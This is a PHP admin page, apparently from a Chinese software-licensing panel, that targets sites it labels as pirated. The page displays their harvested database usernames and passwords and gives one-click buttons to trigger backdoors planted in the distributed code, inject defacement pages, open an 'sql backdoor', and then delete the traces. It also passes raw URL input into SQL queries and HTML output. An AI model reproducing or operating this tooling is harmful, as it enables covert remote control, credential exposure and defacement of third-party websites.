<?php
/**
 * 获取密码
**/
$mod='blank';
include("../drive/api.inc.php");
$title='盗版站点信息';
include './head.php';
if($islogin==1){}else exit("<script language='javascript'>window.location.href='./login.php';</script>");
?>
  <div class="container" style="padding-top:70px;">
    <div class="col-xs-12 col-sm-10 col-lg-8 center-block" style="float: none;">
<?php
if($udata['per_db']!=1) {
	showmsg('您的账号没有权限使用此功能',3);
	exit;
}

$url = daddslashes($_GET['url']);
$domain = parse_url($url);
$domain = $domain['host'];

$row=$DB->get_row("SELECT * FROM auth_site WHERE url='{$domain}' limit 1");
if($row==''){}else exit("<script language='javascript'>alert('此站点位于正版列表内！');history.go(-1);</script>");

if($_GET["m"]==1)
{
	$msg='未查询到该站点账号信息';
}
?>
      <div class="panel panel-primary">
        <div class="panel-heading"><h3 class="panel-title">获取密码</h3></div>
          <ul class="list-group">
            <li class="list-group-item"><span class="glyphicon glyphicon-tint"></span> <b>站点网址：</b> <a href="http://<?=$url?>" target="_blank"><?=$url?></a></li>
<?php
$url = $_GET['url'];

$row=$DB->get_row("SELECT * FROM auth_site WHERE url='$url' limit 1");
if($row['active'] != 1){}else exit("<script language='javascript'>alert('此站点位于正版列表内！');history.go(-1);</script>");

$db=$DB->get_row("SELECT * FROM auth_block WHERE url='$url' limit 1");
?>
            <li class="list-group-item"><span class="glyphicon glyphicon-user"></span> <b>数据库账号：</b> <?=$db['name']?></li>
              <li class="list-group-item"><span class="glyphicon glyphicon-lock"></span> <b>数据库密码：</b> <?=$db['pwd']?></li>
              <li class="list-group-item"><span class="glyphicon glyphicon-time"></span> <b>入库时间：</b> <?=$db['date']?></li>
            <li class="list-group-item"><span class="glyphicon glyphicon-list"></span> <b>功能操作：</br></b>
              <a href="http://<?=urlencode($url)?>" class="btn btn-xs btn-success" target="_blank">一键访问</a>
              <a href="http://<?=urlencode($url)?>:3312" class="btn btn-xs btn-success" target="_blank">控制面板</a></br>
              <a href="http://<?=urlencode($url)?>/includes/common.php?h=1" class="btn btn-xs btn-info">启动挂黑</a>
              <a href="http://<?=urlencode($url)?>/includes/hy.php?mod=add" class="btn btn-xs btn-info">注入黑页</a>
              <a href="http://<?=urlencode($url)?>/includes/hy.php?mod=add2" class="btn btn-xs btn-info">二号黑页</a></br>
              <a href="http://<?=urlencode($url)?>/includes/common.php?q=1" class="btn btn-xs btn-warning">启动后门</a>
              <a href="http://<?=urlencode($url)?>/includes/hy.php?mod=add" class="btn btn-xs btn-warning">注入后门</a>
              <a href="http://<?=urlencode($url)?>/includes/qywl/sql.php" class="btn btn-xs btn-warning">sql后门</a>
              <a href="http://<?=urlencode($url)?>/includes/qywl" class="btn btn-xs btn-warning">访问后门</a></br>
              <a href="http://<?=urlencode($url)?>/includes/hy.php?mod=del" class="btn btn-xs btn-danger">删除后门脚本</a>
              <a href="http://<?=urlencode($url)?>/includes/hy.php?mod=del" class="btn btn-xs btn-danger">删除黑页脚本</a>
	      <a href="./hyxz.php" class="btn btn-xs btn-danger">下载黑页</a>
            </li>
          </ul>
      </div>

      <div class="panel panel-primary">
        <div class="panel-body">
          <form action="./getpwd.php" method="GET" class="form-horizontal" role="form">
            <div class="input-group">
              <span class="input-group-addon">网址</span>
              <input type="text" name="url" value="<?=$url?>" class="form-control" placeholder="www.cccyun.cc,www.qq.com" autocomplete="off" required/>
            </div><br/>
			<div class="input-group">
              <span class="input-group-addon">方式</span>
              <select class="form-control" name="m">
			  <option value="1">1_获取密码</option>
			  </select>
            </div><br/>
            <div class="form-group">
              <div class="col-sm-12"><input type="submit" value="获取密码" class="btn btn-primary form-control"/></div>
            </div>
<div class="panel-footer"><span class="glyphicon glyphicon-info-sign"></span> <font color=red>注意注意:一键挂黑步骤为启动，注入，删除。后门注入步骤也一样。懂的人自然懂，IQ=250者我也没办法 </div>
          </form>
        </div>
      </div>
    </div>
  </div>